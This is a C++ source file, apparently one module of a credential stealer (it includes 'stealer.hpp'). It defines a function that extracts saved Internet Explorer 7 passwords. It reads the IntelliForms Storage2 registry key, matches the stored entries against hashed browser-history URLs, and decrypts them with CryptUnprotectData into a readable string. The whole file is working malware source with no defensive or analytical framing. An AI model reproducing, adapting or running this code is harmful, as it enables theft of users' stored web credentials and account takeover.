#include "../stealer.hpp"

string GetIE7Passwords( API *api ) {
	string final = "";
	try {
		HKEY hKey;
		char Val[50], Hash[50];
		DWORD Size, dwType, BufferSize;
		char Values[50][50];
		int i = 0;

		if (api->RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2", 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
			Size = 50;
			while (api->RegEnumValue(hKey, i, Val, &Size, NULL, NULL, NULL, NULL) != ERROR_NO_MORE_ITEMS && i < 50) {
				api->lstrcpy(Values[i++], Val);
				Size = 50;
			}
			if (!i) {
				api->RegCloseKey(hKey);
				return "";
			}

			api->CoInitialize(NULL);
			IUrlHistoryStg2* pHistStg2 = NULL;
			GUID CLSID_CUrlHistory = {0x3C374A40, 0xBAE4, 0x11CF, 0xBF, 0x7D, 0x00, 0xAA, 0x00, 0x69, 0x46, 0xEE}; 
			HRESULT hr = api->CoCreateInstance(CLSID_CUrlHistory, NULL, CLSCTX_INPROC_SERVER, IID_IUrlHistoryStg2, (void**)(&pHistStg2));
			if (SUCCEEDED(hr)) {
				IEnumSTATURL* pEnumUrls;
				hr = pHistStg2->EnumUrls(&pEnumUrls);
				if (SUCCEEDED(hr)) {
					STATURL StatUrl[1];
					ULONG ulFetched;
					while ((hr = pEnumUrls->Next(1, StatUrl, &ulFetched)) == S_OK) {
						wchar_t *p = StatUrl->pwcsUrl;
						for (p = StatUrl->pwcsUrl; *p; p++) {
							if (*p == '?') {
								*p = (wchar_t)0;
								break;
							}
						}

						GetHashStr(api, StatUrl->pwcsUrl, Hash);

						for (int x = 0; x < i; x++) {
							if (api->lstrcmp(Values[x], Hash) == 0) {
								api->RegQueryValueEx(hKey, Values[x], NULL, &dwType, NULL, &BufferSize);
								char buff[256] = "\0";
								if (api->RegQueryValueEx(hKey, Values[x], NULL, &dwType, (BYTE*)buff, &BufferSize) == ERROR_SUCCESS) {
									DATA_BLOB DataIn;
									DATA_BLOB DataOut;
									DATA_BLOB OptionalEntropy;
									DataIn.pbData = (BYTE*)buff;
									DataIn.cbData = BufferSize;
									OptionalEntropy.pbData = (BYTE*)StatUrl->pwcsUrl;
									OptionalEntropy.cbData = (DWORD)p - (DWORD)StatUrl->pwcsUrl + sizeof(wchar_t);
                        
									if(api->CryptUnprotectData(&DataIn, 0, &OptionalEntropy, NULL, NULL, 0, &DataOut)) {
										char filebuff[200];
										api->wsprintf(filebuff, "IE: %ls | ", StatUrl->pwcsUrl);

										final += filebuff;
										
										final += PrintData(api, (char *)DataOut.pbData);

										api->LocalFree(DataOut.pbData);
									}
								}
							}
						}
					}
					pEnumUrls->Release();
				}
				pHistStg2->Release();
			}
			api->CoUninitialize();
			api->RegCloseKey(hKey);
		}
	} catch (...) {
	}
	return final;
}